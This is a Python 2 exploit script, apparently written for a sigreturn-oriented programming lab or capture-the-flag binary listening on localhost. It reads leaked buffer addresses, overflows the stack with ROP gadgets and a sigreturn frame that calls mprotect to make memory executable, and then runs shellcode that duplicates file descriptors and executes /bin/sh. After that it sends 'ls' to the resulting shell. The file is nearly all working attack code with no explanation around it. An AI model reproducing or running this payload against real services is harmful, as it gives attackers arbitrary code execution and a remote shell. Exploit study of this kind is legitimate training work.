from socket import create_connection
import struct
from Frame import SigreturnFrame

XOR_RAX_RAX   = 0x0000000000445440
SYSCALL_RET   = 0x000000000040116f # syscall ; ret
SIGRETURN_IND = 0x0000000000401168 # mov rax, 15; syscall; ret

PAGE_SIZE     = 4096

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection(("127.0.0.1", 7171))
buffer_address = recv_n_bytes(s, 8)
buffer_address = struct.unpack("<Q", buffer_address)[0]
buffer_page = buffer_address & ~(PAGE_SIZE - 1)
print "[+] Buffer address is", hex(buffer_address)

page = recv_n_bytes(s, 8)
page = struct.unpack("<Q", page)[0]
print "[+] mmap'd page address is", hex(page)

sploit  = "\x90" * (0x40-(8*4))
sploit += "B" * 8
sploit += struct.pack("<Q", XOR_RAX_RAX)
sploit += struct.pack("<Q", SIGRETURN_IND)

frame = SigreturnFrame(arch="x64")
frame.set_regvalue("rax", 0xa)
frame.set_regvalue("rdi", buffer_page)
frame.set_regvalue("rsi", 0x1000)
frame.set_regvalue("rdx", 0x7)
frame.set_regvalue("rsp", buffer_address+304)
frame.set_regvalue("rip", SYSCALL_RET)
sploit += frame.get_frame()
sploit += struct.pack("<Q", buffer_address+312)
sploit += "\x6a\x02\x5e\x48\x31\xff\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\x31\xc0\x48\xb8\x21\x00\x00\x00\x00\x00\x00\x00\x0f\x05\x48\xff\xce\x79\xec"
sploit += "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

s.send(sploit)
s.send("ls\n")
print repr(s.recv(1024))
